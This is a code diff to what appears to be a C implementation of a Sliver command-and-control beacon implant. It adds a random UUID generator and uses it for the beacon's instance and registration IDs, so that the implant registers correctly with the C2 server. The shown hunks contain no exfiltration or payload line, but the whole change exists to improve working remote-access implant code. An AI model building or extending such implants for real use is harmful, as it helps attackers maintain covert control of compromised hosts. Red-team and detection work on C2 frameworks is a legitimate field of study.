@@ -200,7 +200,7 @@ static int beacon_recv(beacon_conn_t *c, const char *server_pubkey, sliver_buf_t
   return rc;
 }
 
-/* --- jitter --------------------------------------------------------------- */
+/* --- jitter / random ------------------------------------------------------ */
 static uint64_t beacon_rand_u64(void) {
   static uint64_t seed = 0;
   if (seed == 0) {
@@ -210,6 +210,25 @@ static uint64_t beacon_rand_u64(void) {
   seed ^= seed >> 7;
   seed ^= seed << 17;
   return seed;
+}
+
+/* Generates a random RFC 4122 version-4 UUID (same shape as Go's uuid.NewV4). */
+static void uuid4_generate(char *out, size_t cap) {
+  static const char hex[] = "0123456789abcdef";
+  char buf[37];
+  int i;
+
+  if (out == NULL || cap < 37) {
+    return;
+  }
+  for (i = 0; i < 36; ++i) {
+    uint64_t r = beacon_rand_u64();
+    buf[i] = (i == 8 || i == 13 || i == 18 || i == 23) ? '-' : hex[r & 0xf];
+  }
+  buf[14] = '4';                               /* version 4 */
+  buf[19] = hex[8 + (beacon_rand_u64() & 0x3)]; /* variant 8..b */
+  buf[36] = '\0';
+  (void)snprintf(out, cap, "%s", buf);
 }
 
 /* Encodes one dispatch result as an Envelope and queues it. */
@@ -238,6 +257,7 @@ static void beacon_dispatch_task(const sliver_envelope_t *task) {
 int sliver_beacon_run(const char *argv0) {
   sliver_session_config_t cfg;
   char host[256];
+  char instance_id[37];
   beacon_conn_t conn;
   char err[256];
   long long interval_ns = sliver_config_beacon_interval_ns();
@@ -249,7 +269,13 @@ int sliver_beacon_run(const char *argv0) {
   if (sliver_session_config_build(&cfg, host, sizeof(host), argv0) != 0) {
     return -1;
   }
-  id = sliver_config_build_id()[0] != '\0' ? sliver_config_build_id() : sliver_config_name();
+  /* The Go implant uses a fresh random UUID per beacon instance (InstanceID) and
+   * a host UUID for Register.Uuid. The server's beacon handler does NOT fall back
+   * to a random UUID like the session handler does, so both must be valid UUIDs;
+   * build_id is the implant name at build time and is not a UUID. */
+  uuid4_generate(instance_id, sizeof(instance_id));
+  (void)snprintf(cfg.reg.uuid, sizeof(cfg.reg.uuid), "%s", instance_id);
+  id = instance_id;
   interval_ms = (uint32_t)((interval_ns > 0 ? interval_ns : 60000000000LL) / 1000000LL);
   next_checkin = (int64_t)((interval_ns > 0 ? interval_ns : 60000000000LL) / 1000000000LL);
 
